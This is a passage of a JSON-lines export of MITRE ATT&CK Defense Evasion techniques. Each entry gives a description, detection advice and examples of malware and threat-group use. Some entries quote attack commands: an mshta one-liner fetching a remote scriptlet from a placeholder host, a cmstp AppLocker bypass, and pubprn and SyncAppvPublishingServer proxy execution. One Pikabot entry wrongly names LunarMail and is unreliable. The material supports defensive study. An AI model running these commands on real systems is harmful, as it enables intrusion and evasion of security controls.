archive that launches an AutoIT loader.","[S0260] InvisiMole: InvisiMole can decrypt, unpack and load a DLL from its resources, or from blobs encrypted with Data Protection API, two-key triple DES, and variations of the XOR cipher.","[S0394] HiddenWasp: HiddenWasp uses a cipher to implement a decoding function.","[S0665] ThreatNeedle: ThreatNeedle can decrypt its payload using RC4, AES, or one-byte XORing.","[S0390] SQLRat: SQLRat has scripts that are responsible for deobfuscating additional scripts.","[S0562] SUNSPOT: SUNSPOT decrypts SUNBURST, which was stored in AES128-CBC encrypted blobs.","[S0476] Valak: Valak has the ability to decode and decrypt downloaded files.","[G0065] Leviathan: Leviathan has used a DLL known as SeDll to decrypt and execute other JavaScript backdoors.","[S0560] TEARDROP: TEARDROP was decoded using a custom rolling XOR algorithm to execute a customized Cobalt Strike payload.","[S0196] PUNCHBUGGY: PUNCHBUGGY has used PowerShell to decode base64-encoded assembly.","[S0353] NOKKI: NOKKI uses a unique, custom de-obfuscation technique.","[G1021] Cinnamon Tempest: Cinnamon Tempest has used weaponized DLLs to load and decrypt payloads.","[S1145] Pikabot: Pikabot decrypts command and control URIs using ADVobfuscator, and decrypts IP addresses and port numbers with a custom algorithm. Other versions of Pikabot decode chunks of stored stage 2 payload content in the initial payload .text section before consolidating them for further execution. Overall LunarMail is associated with multiple encoding and encryption mechanisms to obfuscate the malware's presence and avoid analysis or detection.","[S1182] MagicRAT: MagicRAT stores command and control URLs using base64 encoding in the malware's configuration file.","[S0613] PS1: PS1 can use an XOR key to decrypt a PowerShell loader and payload binary.","[S0348] Cardinal RAT: Cardinal RAT decodes many of its artifacts and is decrypted (AES-128) after being downloaded.","[S1173] PowerExchange: PowerExchange can decode and decrypt C2 commands received via email.","[S0689] WhisperGate: WhisperGate can deobfuscate downloaded files stored in reverse byte order and decrypt embedded resources using multiple XOR operations.","[G0106] Rocke: Rocke has extracted tar.gz files after downloading them from a C2 server.","[S0632] GrimAgent: GrimAgent can use a decryption algorithm for strings based on Rotate on Right (RoR) and Rotate on Left (RoL) functionality.","[C0037] Water Curupira Pikabot Distribution: Water Curupira Pikabot Distribution used highly obfuscated JavaScript files as one initial installer for Pikabot.","[S1046] PowGoop: PowGoop can decrypt PowerShell scripts for execution.","[S1183] StrelaStealer: StrelaStealer payloads have included strings encrypted via XOR. StrelaStealer JavaScript payloads utilize Base64-encoded payloads that are decoded via certutil to create a malicious DLL file.","[S0514] WellMess: WellMess can decode and decrypt data received from C2.","[S0628] FYAnti: FYAnti has the ability to decrypt an embedded .NET module.","[S1130] Raspberry Robin: Raspberry Robin contains several layers of obfuscation to hide malicious code from detection and analysis.","[S0477] Goopy: Goopy has used a polymorphic decryptor to decrypt itself at runtime.","[S0612] WastedLocker: WastedLocker's custom cryptor, CryptOne, used an XOR based algorithm to decrypt the payload.","[S0013] PlugX: PlugX decompresses and decrypts itself using the Microsoft API call RtlDecompressBuffer.","[S1105] COATHANGER: COATHANGER decodes configuration items from a bundled file for command and control activity.","[S0585] Kerrdown: Kerrdown can decode, decrypt, and decompress multiple layers of shellcode.","[S1014] DanBot: DanBot can use a VBA macro to decode its payload prior to installation and execution.","[S1031] PingPull: PingPull can decrypt received data from its C2 server by using AES.","[S0642] BADFLICK: BADFLICK can decode shellcode using a custom rotating XOR cipher.","[S0022] Uroburos: Uroburos can decrypt command parameters sent through C2 and use unpacking code to extract its packed executable.","[S0501] PipeMon: PipeMon can decrypt password-protected executables.","[S1180] BlackByte Ransomware: BlackByte Ransomware is distributed as an obfuscated JavaScript launcher file.","[S0258] RGDoor: RGDoor decodes Base64 strings and decrypts strings using a custom XOR algorithm.","[S0182] FinFisher: FinFisher extracts and decrypts stage 3 malware, which is stored in encrypted resources.","[G0081] Tropic Trooper: Tropic Trooper used shellcode with an XOR algorithm to decrypt a payload. Tropic Trooper also decrypted image files which contained a payload.","[G1016] FIN13: FIN13 has utilized `certutil` to decode base64 encoded versions of custom malware.","[S1025] Amadey: Amadey has decoded antivirus name strings.","[S1112] STEADYPULSE: STEADYPULSE can URL decode key/value pairs sent over C2.","[C0001] Frankenstein: During Frankenstein, the threat actors deobfuscated Base64-encoded commands following the execution of a malicious script, which revealed a small script designed to obtain an additional payload.","[S0347] AuditCred: AuditCred uses XOR and RC4 to perform decryption on the code functions.","[S0141] Winnti for Windows: The Winnti for Windows dropper can decrypt and decompresses a data blob.","[S0534] Bazar: Bazar can decrypt downloaded payloads. Bazar also resolves strings and other artifacts at runtime.","[S1148] Raccoon Stealer: Raccoon Stealer uses RC4-encrypted, base64-encoded strings to obfuscate functionality and command and control servers.","[S0428] PoetRAT: PoetRAT has used LZMA and base64 libraries to decode obfuscated scripts.","[G0034] Sandworm Team: Sandworm Team's VBS backdoor can decode Base64-encoded data and save it to the %TEMP% folder. The group also decrypted received information using the Triple DES algorithm and decompresses it using GZip.","[S1012] PowerLess: PowerLess can use base64 and AES ECB decryption prior to execution of downloaded modules.","[S0052] OnionDuke: OnionDuke can use a custom decryption algorithm to decrypt strings.","[C0016] Operation Dust Storm: During Operation Dust Storm, attackers used VBS code to decode payloads.","[S0251] Zebrocy: Zebrocy decodes its secondary payload and writes it to the victim’s machine. Zebrocy also uses AES and XOR to decrypt strings and payloads.","[G1026] Malteiro: Malteiro has the ability to deobfuscate downloaded files prior to execution.","[S0330] Zeus Panda: Zeus Panda decrypts strings in the code during the execution process.","[S1140] Spica: Upon execution Spica can decode an embedded .pdf and write it to the desktop as a decoy document.","[S1123] PITSTOP: PITSTOP can deobfuscate base64 encoded and AES encrypted commands.","[S0475] BackConfig: BackConfig has used a custom routine to decrypt strings.","[S0687] Cyclops Blink: Cyclops Blink can decrypt and parse instructions sent from C2.","[S0520] BLINDINGCAN: BLINDINGCAN has used AES and XOR to decrypt its DLLs.","[S1120] FRAMESTING: FRAMESTING can decompress data received within `POST` requests.","[S0631] Chaes: Chaes has decrypted an AES encrypted binary file to trigger the download of other files.","[S0234] Bandook: Bandook has decoded its PowerShell script.","[S0516] SoreFang: SoreFang can decode and decrypt exfiltrated data sent to C2.","[S0458] Ramsay: Ramsay can extract its agent from the body of a malicious document.","[S0280] MirageFox: MirageFox has a function for decrypting data containing C2 configuration information.","[S0653] xCaon: xCaon has decoded strings from the C2 server before executing commands.","[S0455] Metamorfo: Upon execution, Metamorfo has unzipped itself after being downloaded to the system and has performed string decryption.","[S1118] BUSHWALK: BUSHWALK can Base64 decode and RC4 decrypt malicious payloads sent through a web request’s command parameter.","[S0526] KGH_SPY: KGH_SPY can decrypt encrypted strings and write them to a newly created folder.","[S0614] CostaBricks: CostaBricks has the ability to use bytecode to decrypt embedded payloads.","[S0270] RogueRobin: RogueRobin decodes an embedded executable using base64 and decompresses it.","[S0604] Industroyer: Industroyer decrypts code to connect to a remote C2 server.","[S1200] StealBit: StealBit can deobfuscate loaded modules prior to execution.","[S1170] ODAgent: ODAgent can Base64-decode and XOR decrypt received C2 commands.","[S1172] OilBooster: OilBooster can Base64-decode and XOR-decrypt C2 commands taken from JSON files.","[S1013] ZxxZ: ZxxZ has used a XOR key to decrypt strings.","[S1133] Apostle: Apostle compiled code is obfuscated in an unspecified fashion prior to delivery to victims.","[C0006] Operation Honeybee: During Operation Honeybee, malicious files were decoded prior to execution.","[G0073] APT19: An APT19 HTTP malware variant decrypts strings using single-byte XOR keys.","[S0624] Ecipekac: Ecipekac has the ability to decrypt fileless loader modules.","[G0126] Higaisa: Higaisa used certutil to decode Base64 binaries at runtime and a 16-byte XOR key to decrypt data.","[S0512] FatDuke: FatDuke can decrypt AES encrypted C2 communications.","[S1147] Nightdoor: Nightdoor stores network configuration data in a file XOR encoded with the key value of `0x7A`.","[C0046] ArcaneDoor: ArcaneDoor involved the use of Base64 obfuscated scripts and commands.","[S0180] Volgmer: Volgmer deobfuscates its strings and APIs once its executed.","[S0582] LookBack: LookBack has a function that decrypts malicious data.","[S0518] PolyglotDuke: PolyglotDuke can use a custom algorithm to decrypt strings used by the malware.","[S0565] Raindrop: Raindrop decrypted its Cobalt Strike payload using an AES-256 encryption algorithm in CBC mode with a unique key per sample.","[S0567] Dtrack: Dtrack has used a decryption routine that is part of an executable physical patch.","[S0499] Hancitor: Hancitor has decoded Base64 encoded URLs to insert a recipient’s name into the filename of the Word document. Hancitor has also extracted executables from ZIP files."],"tactics":"TA0005 - Defense Evasion"}
{"technique_id":"T1197","technique_name":"BITS Jobs","description":"Adversaries may abuse BITS jobs to persistently execute code and perform various background tasks. Windows Background Intelligent Transfer Service (BITS) is a low-bandwidth, asynchronous file transfer mechanism exposed through Component Object Model (COM). BITS is commonly used by updaters, messengers, and other applications preferred to operate in the background (using available idle bandwidth) without interrupting other networked applications. File transfer tasks are implemented as BITS jobs, which contain a queue of one or more file operations. The interface to create and manage BITS jobs is accessible through PowerShell and the BITSAdmin tool. Adversaries may abuse BITS to download (e.g. Ingress Tool Transfer), execute, and even clean up after running malicious code (e.g. Indicator Removal). BITS tasks are self-contained in the BITS job database, without new files or registry modifications, and often permitted by host firewalls. BITS enabled execution may also enable persistence by creating long-standing jobs (the default maximum lifetime is 90 days and extendable) or invoking an arbitrary program when a job completes or errors (including after system reboots). BITS upload functionalities can also be used to perform Exfiltration Over Alternative Protocol.","detection":"BITS runs as a service and its status can be checked with the Sc query utility (sc query bits). Active BITS tasks can be enumerated using the BITSAdmin tool (bitsadmin /list /allusers /verbose). Monitor usage of the BITSAdmin tool (especially the ‘Transfer’, 'Create', 'AddFile', 'SetNotifyFlags', 'SetNotifyCmdLine', 'SetMinRetryDelay', 'SetCustomHeaders', and 'Resume' command options) Admin logs, PowerShell logs, and the Windows Event log for BITS activity. Also consider investigating more detailed information about jobs by parsing the BITS job database. Monitor and analyze network activity generated by BITS. BITS jobs use HTTP(S) and SMB for remote connections and are tethered to the creating user and will only function when that user is logged on (this rule applies even if a user attaches the job to a service account).","procedures":["[S0652] MarkiRAT: MarkiRAT can use BITS Utility to connect with the C2 server.","[G0040] Patchwork: Patchwork has used BITS jobs to download malicious payloads.","[S0534] Bazar: Bazar has been downloaded via Windows BITS functionality.","[S0154] Cobalt Strike: Cobalt Strike can download a hosted \"beacon\" payload using BITSAdmin.","[S0554] Egregor: Egregor has used BITSadmin to download and execute malicious DLLs.","[S0201] JPIN: A JPIN variant downloads the backdoor payload via the BITS service.","[S0333] UBoatRAT: UBoatRAT takes advantage of the /SetNotifyCmdLine option in BITSAdmin to ensure it stays running on a system to maintain persistence.","[S0654] ProLock: ProLock can use BITS jobs to download its malicious payload.","[G0065] Leviathan: Leviathan has used BITSAdmin to download additional tools.","[G0087] APT39: APT39 has used the BITS protocol to exfiltrate stolen data from a compromised host.","[S0190] BITSAdmin: BITSAdmin can be used to create BITS Jobs to launch a malicious process.","[G0096] APT41: APT41 used BITSAdmin to download and install payloads.","[G0102] Wizard Spider: Wizard Spider has used batch scripts that utilizes WMIC to execute a BITSAdmin transfer of a ransomware payload to each compromised machine."],"tactics":"TA0005 - Defense Evasion"}
{"technique_id":"T1202","technique_name":"Indirect Command Execution","description":"Adversaries may abuse utilities that allow for command execution to bypass security restrictions that limit the use of command-line interpreters. Various Windows utilities may be used to execute commands, possibly without invoking cmd. For example, Forfiles, the Program Compatibility Assistant (`pcalua.exe`), components of the Windows Subsystem for Linux (WSL), `Scriptrunner.exe`, as well as other utilities may invoke the execution of programs and commands from a Command and Scripting Interpreter, Run window, or via scripts. Adversaries may also abuse the `ssh.exe` binary to execute malicious commands via the `ProxyCommand` and `LocalCommand` options, which can be invoked via the `-o` flag or by modifying the SSH config file. Adversaries may abuse these features for Defense Evasion, specifically to perform arbitrary execution while subverting detections and/or mitigation controls (such as Group Policy) that limit/prevent the usage of cmd or file extensions more commonly associated with malicious payloads.","detection":"Monitor and analyze logs from host-based detection mechanisms, such as Sysmon, for events such as process creations that include or are resulting from parameters associated with invoking programs/commands/files and/or spawning child processes/network connections.","procedures":["[G0032] Lazarus Group: Lazarus Group persistence mechanisms have used forfiles.exe to execute .htm files.","[S0193] Forfiles: Forfiles can be used to subvert controls and possibly conceal command execution by not directly invoking cmd.","[S0379] Revenge RAT: Revenge RAT uses the Forfiles utility to execute commands on the system.","[G1039] RedCurl: RedCurl has used pcalua.exe to obfuscate binary execution and remote connections."],"tactics":"TA0005 - Defense Evasion"}
{"technique_id":"T1205.001","technique_name":"Traffic Signaling: Port Knocking","description":"Adversaries may use port knocking to hide open ports used for persistence or command and control. To enable a port, an adversary sends a series of attempted connections to a predefined sequence of closed ports. After the sequence is completed, opening a port is often accomplished by the host based firewall, but could also be implemented by custom software. This technique has been observed both for the dynamic opening of a listening port as well as the initiating of a connection to a listening server on a different system. The observation of the signal packets to trigger the communication can be conducted through different methods. One means, originally implemented by Cd00r , is to use the libpcap libraries to sniff for the packets in question. Another method leverages raw sockets, which enables the malware to use ports that are already open for use by other programs.","detection":"Record network packets sent to and from the system, looking for extraneous packets that do not belong to established flows.","procedures":["[S1060] Mafalda: Mafalda can use port-knocking to authenticate itself to another implant called Cryshell to establish an indirect connection to the C2 server.","[G0056] PROMETHIUM: PROMETHIUM has used a script that configures the knockd service and firewall to only accept C2 connections from systems that use a specified sequence of knock ports.","[S1204] cd00r: cd00r can monitor for a single TCP-SYN packet to be sent in series to a configurable set of ports (200, 80, 22, 53 and 3 in the original code) before opening a port for communication.","[S1059] metaMain: metaMain has authenticated itself to a different implant, Cryshell, through a port knocking and handshake procedure."],"tactics":"TA0005 - Defense Evasion"}
{"technique_id":"T1205.002","technique_name":"Traffic Signaling: Socket Filters","description":"Adversaries may attach filters to a network socket to monitor then activate backdoors used for persistence or command and control. With elevated permissions, adversaries can use features such as the `libpcap` library to open sockets and install filters to allow or disallow certain types of data to come through the socket. The filter may apply to all traffic passing through the specified network interface (or every interface if not specified). When the network interface receives a packet matching the filter criteria, additional actions can be triggered on the host, such as activation of a reverse shell. To establish a connection, an adversary sends a crafted packet to the targeted host that matches the installed filter criteria. Adversaries have used these socket filters to trigger the installation of implants, conduct ping backs, and to invoke command shells. Communication with these socket filters may also be used in conjunction with Protocol Tunneling. Filters can be installed on any Unix-like platform with `libpcap` installed or on Windows hosts using `Winpcap`. Adversaries may use either `libpcap` with `pcap_setfilter` or the standard library function `setsockopt` with `SO_ATTACH_FILTER` options. Since the socket connection is not active until the packet is received, this behavior may be difficult to detect due to the lack of activity on a host, low CPU overhead, and limited visibility into raw socket usage.","detection":"Identify running processes with raw sockets. Ensure processes listed have a need for an open raw socket and are in accordance with enterprise policy.","procedures":["[S1161] BPFDoor: BPFDoor uses BPF bytecode to attach a filter to a network socket to view ICMP, UDP, or TCP packets coming through ports 22 (ssh), 80 (http), and 443 (https). When BPFDoor finds a packet containing its “magic” bytes, it parses out two fields and forks itself. The parent process continues to monitor filtered traffic while the child process executes the instructions from the parsed fields.","[S1123] PITSTOP: PITSTOP can listen and evaluate incoming commands on the domain socket, created by PITHOOK malware, located at `/data/runtime/cockpit/wd.fd` for a predefined magic byte sequence. PITSTOP can then duplicate the socket for further communication over TLS.","[S0587] Penquin: Penquin installs a `TCP` and `UDP` filter on the `eth0` interface."],"tactics":"TA0005 - Defense Evasion"}
{"technique_id":"T1207","technique_name":"Rogue Domain Controller","description":"Adversaries may register a rogue Domain Controller to enable manipulation of Active Directory data. DCShadow may be used to create a rogue Domain Controller (DC). DCShadow is a method of manipulating Active Directory (AD) data, including objects and schemas, by registering (or reusing an inactive registration) and simulating the behavior of a DC. Once registered, a rogue DC may be able to inject and replicate changes into AD infrastructure for any domain object, including credentials and keys. Registering a rogue DC involves creating a new server and nTDSDSA objects in the Configuration partition of the AD schema, which requires Administrator privileges (either Domain or local to the DC) or the KRBTGT hash. This technique may bypass system logging and security monitors such as security information and event management (SIEM) products (since actions taken on a rogue DC may not be reported to these sensors). The technique may also be used to alter and delete replication and other associated metadata to obstruct forensic analysis. Adversaries may also utilize this technique to perform SID-History Injection and/or manipulate AD objects (such as accounts, access control lists, schemas) to establish backdoors for Persistence.","detection":"Monitor and analyze network traffic associated with data replication (such as calls to DrsAddEntry, DrsReplicaAdd, and especially GetNCChanges) between DCs as well as to/from non DC hosts. DC replication will naturally take place every 15 minutes but can be triggered by an adversary or by legitimate urgent changes (ex: passwords). Also consider monitoring and alerting on the replication of AD objects (Audit Detailed Directory Service Replication Events 4928 and 4929). Leverage AD directory synchronization (DirSync) to monitor changes to directory state using AD replication cookies. Baseline and periodically analyze the Configuration partition of the AD schema and alert on creation of nTDSDSA objects. Investigate usage of Kerberos Service Principal Names (SPNs), especially those associated with services (beginning with “GC/”) by computers not present in the DC organizational unit (OU). The SPN associated with the Directory Replication Service (DRS) Remote Protocol interface (GUID E3514235–4B06–11D1-AB04–00C04FC2DCD2) can be set without logging. A rogue DC must authenticate as a service using these two SPNs for the replication process to successfully complete.","procedures":["[S0002] Mimikatz: Mimikatz’s LSADUMP::DCShadow module can be used to make AD updates by temporarily setting a computer to be a DC."],"tactics":"TA0005 - Defense Evasion"}
{"technique_id":"T1211","technique_name":"Exploitation for Defense Evasion","description":"Adversaries may exploit a system or application vulnerability to bypass security features. Exploitation of a vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Vulnerabilities may exist in defensive security software that can be used to disable or circumvent them. Adversaries may have prior knowledge through reconnaissance that security software exists within an environment or they may perform checks during or shortly after the system is compromised for Security Software Discovery. The security software will likely be targeted directly for exploitation. There are examples of antivirus software being targeted by persistent threat groups to avoid detection. There have also been examples of vulnerabilities in public cloud infrastructure of SaaS applications that may bypass defense boundaries , evade security logs , or deploy hidden infrastructure.","detection":"Exploitation for defense evasion may happen shortly after the system has been compromised to prevent detection during later actions for for additional tools that may be brought in and used. Detecting software exploitation may be difficult depending on the tools available. Software exploits may not always succeed or may cause the exploited process to become unstable or crash. Also look for behavior on the system that might indicate successful compromise, such as abnormal behavior of processes. This could include suspicious files written to disk, evidence of Process Injection for attempts to hide execution or evidence of Discovery.","procedures":["[G1047] Velvet Ant: Velvet Ant exploited CVE-2024-20399 in Cisco Switches to which the threat actor was already able to authenticate in order to escape the NX-OS command line interface and gain access to the underlying operating system for arbitrary command execution.","[G0007] APT28: APT28 has used CVE-2015-4902 to bypass security features."],"tactics":"TA0005 - Defense Evasion"}
{"technique_id":"T1216.001","technique_name":"System Script Proxy Execution: PubPrn","description":"Adversaries may use PubPrn to proxy execution of malicious remote files. PubPrn.vbs is a Visual Basic script that publishes a printer to Active Directory Domain Services. The script may be signed by Microsoft and is commonly executed through the Windows Command Shell via Cscript.exe. For example, the following code publishes a printer within the specified domain: cscript pubprn Printer1 LDAP://CN=Container1,DC=Domain1,DC=Com. Adversaries may abuse PubPrn to execute malicious payloads hosted on remote sites. To do so, adversaries may set the second script: parameter to reference a scriptlet file (.sct) hosted on a remote site. An example command is pubprn.vbs 127.0.0.1 script: This behavior may bypass signature validation restrictions and application control solutions that do not account for abuse of this script. In later versions of Windows (10+), PubPrn.vbs has been updated to prevent proxying execution from a remote site. This is done by limiting the protocol specified in the second parameter to LDAP://, vice the script: moniker which could be used to reference remote code via HTTP(S).","detection":"Monitor script processes, such as `cscript`, and command-line parameters for scripts like PubPrn.vbs that may be used to proxy execution of malicious files.","procedures":["[G0050] APT32: APT32 has used PubPrn.vbs within execution scripts to execute malware, possibly bypassing defenses."],"tactics":"TA0005 - Defense Evasion"}
{"technique_id":"T1216.002","technique_name":"System Script Proxy Execution: SyncAppvPublishingServer","description":"Adversaries may abuse SyncAppvPublishingServer.vbs to proxy execution of malicious PowerShell commands. SyncAppvPublishingServer.vbs is a Visual Basic script associated with how Windows virtualizes applications (Microsoft Application Virtualization, or App-V). For example, Windows may render Win32 applications to users as virtual applications, allowing users to launch and interact with them as if they were installed locally. The SyncAppvPublishingServer.vbs script is legitimate, may be signed by Microsoft, and is commonly executed from `\\System32` through the command line via `wscript.exe`. Adversaries may abuse SyncAppvPublishingServer.vbs to bypass PowerShell execution restrictions and evade defensive counter measures by \"living off the land.\" Proxying execution may function as a trusted/signed alternative to directly invoking `powershell.exe`. For example, PowerShell commands may be invoked using: `SyncAppvPublishingServer.vbs \"n; {PowerShell}\"`","detection":null,"procedures":null,"tactics":"TA0005 - Defense Evasion"}
{"technique_id":"T1218.001","technique_name":"System Binary Proxy Execution: Compiled HTML File","description":"Adversaries may abuse Compiled HTML files (.chm) to conceal malicious code. CHM files are commonly distributed as part of the Microsoft HTML Help system. CHM files are compressed compilations of various content such as HTML documents, images, and scripting/web related programming languages such VBA, JScript, Java, and ActiveX. CHM content is displayed using underlying components of the Internet Explorer browser loaded by the HTML Help executable program (hh.exe). A custom CHM file containing embedded payloads could be delivered to a victim then triggered by User Execution. CHM execution may also bypass application application control on older and/or unpatched systems that do not account for execution of binaries through hh.exe.","detection":"Monitor and analyze the execution and arguments of hh.exe. Compare recent invocations of hh.exe with prior history of known good arguments to determine anomalous and potentially adversarial activity (ex: obfuscated and/or malicious commands). Non-standard process execution trees may also indicate suspicious or malicious behavior, such as if hh.exe is the parent process for suspicious processes and activity relating to other adversarial techniques. Monitor presence and use of CHM files, especially if they are not typically used within an environment.","procedures":["[G0049] OilRig: OilRig has used a CHM payload to load and execute another malicious file once delivered to a victim.","[G0070] Dark Caracal: Dark Caracal leveraged a compiled HTML file that contained a command to download and run an executable.","[G0091] Silence: Silence has weaponized CHM files in their phishing campaigns.","[G0096] APT41: APT41 used compiled HTML (.chm) files for targeting.","[G0082] APT38: APT38 has used CHM files to move concealed payloads.","[S0373] Astaroth: Astaroth uses ActiveX objects for file execution and manipulation."],"tactics":"TA0005 - Defense Evasion"}
{"technique_id":"T1218.002","technique_name":"System Binary Proxy Execution: Control Panel","description":"Adversaries may abuse control.exe to proxy execution of malicious payloads. The Windows Control Panel process binary (control.exe) handles execution of Control Panel items, which are utilities that allow users to view and adjust computer settings. Control Panel items are registered executable (.exe) or Control Panel (.cpl) files, the latter are actually renamed dynamic-link library (.dll) files that export a CPlApplet function. For ease of use, Control Panel items typically include graphical menus available to users after being registered and loaded into the Control Panel. Control Panel items can be executed directly from the command line, programmatically via an application programming interface (API) call, or by simply double-clicking the file. Malicious Control Panel items can be delivered via Phishing campaigns or executed as part of multi-stage malware. Control Panel items, specifically CPL files, may also bypass application and/or file extension allow lists. Adversaries may also rename malicious DLL files (.dll) with Control Panel file extensions (.cpl) and register them to HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Control Panel\\Cpls. Even when these registered DLLs do not comply with the CPL file specification and do not export CPlApplet functions, they are loaded and executed through its DllEntryPoint when Control Panel is executed. CPL files not exporting CPlApplet are not directly executable.","detection":"Monitor and analyze activity related to items associated with CPL files, such as the control.exe and the Control_RunDLL and ControlRunDLLAsUser API functions in shell32.dll. When executed from the command line or clicked, control.exe will execute the CPL file (ex: control.exe file.cpl) before Rundll32 is used to call the CPL's API functions (ex: rundll32.exe shell32.dll,Control_RunDLL file.cpl). CPL files can be executed directly via the CPL API function with just the latter Rundll32 command, which may bypass detections and/or execution filters for control.exe. Inventory Control Panel items to locate unregistered and potentially malicious files present on systems: * Executable format registered Control Panel items will have a globally unique identifier (GUID) and registration Registry entries in HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ControlPanel\\NameSpace and HKEY_CLASSES_ROOT\\CLSID\\{GUID}. These entries may contain information about the Control Panel item such as its display name, path to the local file, and the command executed when opened in the Control Panel. * CPL format registered Control Panel items stored in the System32 directory are automatically shown in the Control Panel. Other Control Panel items will have registration entries in the CPLs and Extended Properties Registry keys of HKEY_LOCAL_MACHINE or HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Control Panel. These entries may include information such as a GUID, path to the local file, and a canonical name used to launch the file programmatically ( WinExec(\"c:\\windows\\system32\\control.exe {Canonical_Name}\", SW_NORMAL);) or from a command line (control.exe /name {Canonical_Name}). * Some Control Panel items are extensible via Shell extensions registered in HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Controls Folder\\{name}\\Shellex\\PropertySheetHandlers where {name} is the predefined name of the system item. Analyze new Control Panel items as well as those present on disk for malicious content. Both executable and CPL formats are compliant Portable Executable (PE) images and can be examined using traditional tools and methods, pending anti-reverse-engineering techniques.","procedures":["[S0260] InvisiMole: InvisiMole can register itself for execution and persistence via the Control Panel.","[S0172] Reaver: Reaver drops and executes a malicious CPL file as its payload."],"tactics":"TA0005 - Defense Evasion"}
{"technique_id":"T1218.003","technique_name":"System Binary Proxy Execution: CMSTP","description":"Adversaries may abuse CMSTP to proxy execution of malicious code. The Microsoft Connection Manager Profile Installer (CMSTP.exe) is a command-line program used to install Connection Manager service profiles. CMSTP.exe accepts an installation information file (INF) as a parameter and installs a service profile leveraged for remote access connections. Adversaries may supply CMSTP.exe with INF files infected with malicious commands. Similar to Regsvr32 / ”Squiblydoo”, CMSTP.exe may be abused to load and execute DLLs and/or COM scriptlets (SCT) from remote servers. This execution may also bypass AppLocker and other application control defenses since CMSTP.exe is a legitimate binary that may be signed by Microsoft. CMSTP.exe can also be abused to Bypass User Account Control and execute arbitrary commands from a malicious INF through an auto-elevated COM interface.","detection":"Use process monitoring to detect and analyze the execution and arguments of CMSTP.exe. Compare recent invocations of CMSTP.exe with prior history of known good arguments and loaded files to determine anomalous and potentially adversarial activity. Sysmon events can also be used to identify potential abuses of CMSTP.exe. Detection strategy may depend on the specific adversary procedure, but potential rules include: * To detect loading and execution of local/remote payloads - Event 1 (Process creation) where ParentImage contains CMSTP.exe and/or Event 3 (Network connection) where Image contains CMSTP.exe and DestinationIP is external. * To detect Bypass User Account Control via an auto-elevated COM interface - Event 10 (ProcessAccess) where CallTrace contains CMLUA.dll and/or Event 12 or 13 (RegistryEvent) where TargetObject contains CMMGR32.exe. Also monitor for events, such as the creation of processes (Sysmon Event 1), that involve auto-elevated CMSTP COM interfaces such as CMSTPLUA (3E5FC7F9-9A51-4367-9063-A120244FBEC7) and CMLUAUTIL (3E000D72-A845-4CD9-BD83-80C07C3B881F).","procedures":["[S1149] CHIMNEYSWEEP: CHIMNEYSWEEP can use CMSTP.exe to install a malicious Microsoft Connection Manager Profile.","[G0069] MuddyWater: MuddyWater has used CMSTP.exe and a malicious INF to execute its POWERSTATS payload.","[S1202] LockBit 3.0: LockBit 3.0 can attempt a CMSTP UAC bypass if it does not have administrative privileges.","[G0080] Cobalt Group: Cobalt Group has used the command cmstp.exe /s /ns C:\\Users\\ADMINI~W\\AppData\\Local\\Temp\\XKNqbpzl.txt to bypass AppLocker and launch a malicious script."],"tactics":"TA0005 - Defense Evasion"}
{"technique_id":"T1218.004","technique_name":"System Binary Proxy Execution: InstallUtil","description":"Adversaries may use InstallUtil to proxy execution of code through a trusted Windows utility. InstallUtil is a command-line utility that allows for installation and uninstallation of resources by executing specific installer components specified in .NET binaries. The InstallUtil binary may also be digitally signed by Microsoft and located in the .NET directories on a Windows system: C:\\Windows\\Microsoft.NET\\Framework\\v\\InstallUtil.exe and C:\\Windows\\Microsoft.NET\\Framework64\\v\\InstallUtil.exe. InstallUtil may also be used to bypass application control through use of attributes within the binary that execute the class decorated with the attribute [System.ComponentModel.RunInstaller(true)].","detection":"Use process monitoring to monitor the execution and arguments of InstallUtil.exe. Compare recent invocations of InstallUtil.exe with prior history of known good arguments and executed binaries to determine anomalous and potentially adversarial activity. Command arguments used before and after the InstallUtil.exe invocation may also be useful in determining the origin and purpose of the binary being executed.","procedures":["[S0631] Chaes: Chaes has used Installutill to download content.","[G0129] Mustang Panda: Mustang Panda has used InstallUtil.exe to execute a malicious Beacon stager.","[S0689] WhisperGate: WhisperGate has used `InstallUtil.exe` as part of its process to disable Windows Defender.","[S1155] Covenant: Covenant can create launchers via an InstallUtil XML file to install new Grunt listeners.","[G0045] menuPass: menuPass has used InstallUtil.exe to execute malicious software.","[S1018] Saint Bot: Saint Bot had used `InstallUtil.exe` to download and deploy executables."],"tactics":"TA0005 - Defense Evasion"}
{"technique_id":"T1218.005","technique_name":"System Binary Proxy Execution: Mshta","description":"Adversaries may abuse mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code Mshta.exe is a utility that executes Microsoft HTML Applications (HTA) files. HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser. Files may be executed by mshta.exe through an inline script: mshta vbscript:Close(Execute(\"GetObject(\"\"script:https[:]//webserver/payload[.]sct\"\")\")) They may also be executed directly from URLs: mshta http[:]//webserver/payload[.]hta Mshta.exe can be used to bypass application control solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings.","detection":"Use process monitoring to monitor the execution and arguments of mshta.exe. Look for mshta.exe executing raw or obfuscated script within the command-line. Compare recent invocations of mshta.exe with prior history of known good arguments and executed .hta files to determine anomalous and potentially adversarial activity. Command arguments used before and after the mshta.exe invocation may also be useful in determining the origin and purpose of the .hta file being executed. Monitor use of HTA files. If they are not typically used within an environment then execution of them may be suspicious","procedures":["[G0121] Sidewinder: Sidewinder has used mshta.exe to execute malicious payloads.","[G0032] Lazarus Group: Lazarus Group has used mshta.exe to execute HTML pages downloaded by initial access documents.","[S0250] Koadic: Koadic can use mshta to serve additional payloads and to help schedule tasks for persistence.","[G0069] MuddyWater: MuddyWater has used mshta.exe to execute its POWERSTATS payload and to pass a PowerShell one-liner for execution.","[S0341] Xbash: Xbash can use mshta for executing scripts.","[G0129] Mustang Panda: Mustang Panda has used mshta.exe to launch collection scripts.","[S0414] BabyShark: BabyShark has used mshta.exe to download and execute applications from a remote server.","[G0140] LazyScripter: LazyScripter has used `mshta.exe` to execute Koadic stagers.","[S0223] POWERSTATS: POWERSTATS can use Mshta.exe to execute additional payloads on 